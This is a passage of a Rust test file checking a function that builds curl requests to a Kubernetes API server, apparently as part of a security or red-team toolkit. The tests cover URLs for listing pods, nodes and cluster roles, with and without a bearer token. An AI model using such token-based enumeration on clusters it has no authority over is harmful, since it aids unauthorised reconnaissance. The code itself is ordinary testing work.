    materialize_k8s_request(&mut procedure, &curl_armory()).unwrap();
    assert!(
        procedure
            .command
            .contains("10.0.0.1:6443/api/v1/namespaces/default/pods?limit=500"),
        "command was: {}",
        procedure.command
    );
    assert!(procedure.command.contains("Bearer mytoken"));
    assert!(
        procedure.k8s_request.is_none(),
        "k8s_request should be consumed"
    );
}

#[test]
fn materialize_k8s_request_cluster_scoped_when_flag_true() {
    let mut procedure = Procedure {
        k8s_request: Some(serde_json::json!({
            "api_server": "https://10.0.0.1:6443",
            "api": "/api/v1",
            "resource": "pods",
            "namespace": "default",
            "cluster_scoped": "true",
            "query": "limit=500",
            "token": "tok",
            "use_ca": false
        })),
        ..Procedure::new("k8s-request", "")
    };
    materialize_k8s_request(&mut procedure, &curl_armory()).unwrap();
    assert!(
        procedure
            .command
            .contains("10.0.0.1:6443/api/v1/pods?limit=500"),
        "command was: {}",
        procedure.command
    );
    assert!(
        !procedure.command.contains("namespaces"),
        "cluster-scoped URL must not contain 'namespaces', got: {}",
        procedure.command
    );
}

#[test]
fn materialize_k8s_request_cluster_scoped_when_namespace_empty() {
    let mut procedure = Procedure {
        k8s_request: Some(serde_json::json!({
            "api_server": "https://10.0.0.1:6443",
            "api": "/apis/rbac.authorization.k8s.io/v1",
            "resource": "clusterroles",
            "token": "tok",
            "use_ca": false
        })),
        ..Procedure::new("k8s-request", "")
    };
    materialize_k8s_request(&mut procedure, &curl_armory()).unwrap();
    assert!(
        procedure
            .command
            .contains("10.0.0.1:6443/apis/rbac.authorization.k8s.io/v1/clusterroles"),
        "command was: {}",
        procedure.command
    );
    assert!(!procedure.command.contains("namespaces"));
}

#[test]
fn materialize_k8s_request_no_token_no_auth_header() {
    let mut procedure = Procedure {
        k8s_request: Some(serde_json::json!({
            "api_server": "https://10.0.0.1:6443",
            "api": "/api/v1",
            "resource": "nodes",
            "use_ca": false
        })),
        ..Procedure::new("k8s-request", "")
    };
    materialize_k8s_request(&mut procedure, &curl_armory()).unwrap();
    assert!(
        !procedure.command.contains("Authorization"),
        "empty token must not produce Authorization header, got: {}",
        procedure.command
    );
}

#[test]
fn materialize_k8s_request_noop_when_field_absent() {
    let mut procedure = Procedure::new("kubectl", "kubectl get pods");
    materialize_k8s_request(&mut procedure, &curl_armory()).unwrap();
    assert_eq!(procedure.command, "kubectl get pods");
}

#[test]
fn materialize_k8s_request_namespaced_when_cluster_scoped_omitted() {
    let mut procedure = Procedure {
        k8s_request: Some(serde_json::json!({
            "api_server": "https://10.0.0.1:6443",
            "api": "/api/v1",
            "resource": "pods",
            "namespace": "kube-system",
            "use_ca": false
        })),
        ..Procedure::new("k8s-request", "")
    };
    materialize_k8s_request(&mut procedure, &curl_armory()).unwrap();
    assert!(
        procedure.command.contains("namespaces/kube-system/pods"),
        "omitting cluster_scoped must default to namespaced; got: {}",
        procedure.command
    );
}
